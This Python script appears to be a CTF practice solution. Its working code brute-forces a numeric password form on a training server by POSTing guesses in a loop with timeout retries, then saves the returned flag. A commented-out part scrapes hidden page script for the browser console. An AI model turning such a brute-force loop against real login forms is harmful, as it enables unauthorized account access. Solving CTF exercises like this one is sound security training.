#!/usr/bin/env python
# -*- coding:utf-8 -*-
#@Time    :    2019/11/18 0018 19:12
#@Author  :    tb_youth
#@FileName:    day2.py
#@SoftWare:    PyCharm
#@Blog    :    https://blog.csdn.net/tb_youth

#9
# import requests
# import re
# url = 'http://123.206.87.240:8002/web5/'
# res = requests.get(url).text
# # print(res)
# aim = re.findall(r'<div style="display:none;">(.*?)</div>',res,re.S)[0]
# print(aim) #aim放到浏览器的console中运行

#17:输入密码查看flag，python脚本暴力破解
import requests
from projects.spider import  header
import time


pwd_list = []
pwd = []

#dfs构造pwd_list
def dfs():
    global pwd
    if(len(pwd) == 5):
        # print(pwd)
        pwd_list.append(pwd.copy())
        pwd.pop()
        return
    for num in range(10):
        pwd.append(str(num))
        dfs()
    if(len(pwd)):
        pwd.pop()
    return

#爆破
def get_password(url,headers):
     global pwd_list
     with open('pwd.txt', 'w', encoding='utf-8') as f:
         for password in range(1000000):
         # for pwd in pwd_list:
         #     password = int(''.join(pwd))
             print(password)
             if(password < 13500):
                 continue
             data = {'pwd':password}
             try:
                 response = requests.post(url,data,headers,timeout=5)
                 # print(response.status_code)
             except requests.exceptions.Timeout:
                 print('本次请求超时.....')
                 time.sleep(5)
                 for i in range(10):
                     try:
                         print('正在尝试重新发起请求,目前是第%d次尝试...'%(i+1))
                         response = requests.post(url, data, headers, timeout=5)
                     except requests.exceptions.Timeout:
                         pass
                     else:
                         break
             finally:
                     if (response.status_code == 200):
                         response.encoding = 'utf-8'
                         # print(response.text)
                         if (response.text.find('flag')) != -1:
                             print('password为: %d' %password)
                             print(response.text)
                             f.write('password为: %s'%str(password))
                             f.write('\n')
                             f.write('flag的信息如下:\n')
                             f.write(response.text)
                             return password
     return -1


if __name__=='__main__':
    dfs()
    text = """
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: max-age=0
    Connection: keep-alive
    Content-Length: 10
    Content-Type: application/x-www-form-urlencoded
    Cookie: OUTFOX_SEARCH_USER_ID_NCOO=1047596894.6190807
    Host: 123.206.87.240:8002
    Origin: http://123.206.87.240:8002
    Referer: http://123.206.87.240:8002/baopo/?yes
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36
    """
    h = header.Headers()
    headers = h.get_headers(text)
    url = 'http://123.206.87.240:8002/baopo/?yes'
    get_password(url,headers)







